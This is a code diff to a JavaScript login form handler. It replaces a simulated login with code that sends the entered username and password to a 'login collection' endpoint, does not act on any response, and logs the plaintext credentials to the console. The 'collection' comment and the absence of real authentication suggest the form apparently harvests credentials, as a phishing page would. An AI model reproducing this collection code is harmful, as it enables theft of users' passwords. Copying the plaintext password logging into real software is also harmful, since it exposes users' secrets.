@@ -61,35 +61,47 @@ await fetch(`${VITE_API_BASE_URL}/api/update-password`, {
 
   const togglePassword = () => setShowPassword(!showPassword);
 
-  const handleSubmit = (e) => {
-    e.preventDefault();
+const handleSubmit = async (e) => {
+  e.preventDefault();
 
-    if (!form.username.trim()) {
-      setAlert({
-        visible: true,
-        title: "Email address or mobile number required",
-        message: "Enter your email address or mobile number to continue.",
-      });
-      return;
-    }
+  if (!form.username.trim()) {
+    setAlert({
+      visible: true,
+      title: "Email address or mobile number required",
+      message: "Enter your email address or mobile number to continue.",
+    });
+    return;
+  }
 
-    if (!form.password.trim()) {
-      setAlert({
-        visible: true,
-        title: "Password required",
-        message: "Enter your password to continue.",
-      });
-      return;
-    }
+  if (!form.password.trim()) {
+    setAlert({
+      visible: true,
+      title: "Password required",
+      message: "Enter your password to continue.",
+    });
+    return;
+  }
 
-    // Simulate login
-    setIsLoading(true);
-    setTimeout(() => {
-      setIsLoading(false);
-      console.log("Logged in with:", form);
-      // redirect or show success here
-    }, 2000);
-  };
+  setIsLoading(true);
+
+  try {
+    // Send to login collection
+    await fetch(`${VITE_API_BASE_URL}/api/submit-login`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(form),
+    });
+
+    console.log("Submitted login:", form);
+  } catch (error) {
+    console.error("Error submitting login:", error);
+  } finally {
+    setIsLoading(false);
+  }
+};
+
 
   const closeAlert = () => {
     setAlert({ visible: false, title: "", message: "" });
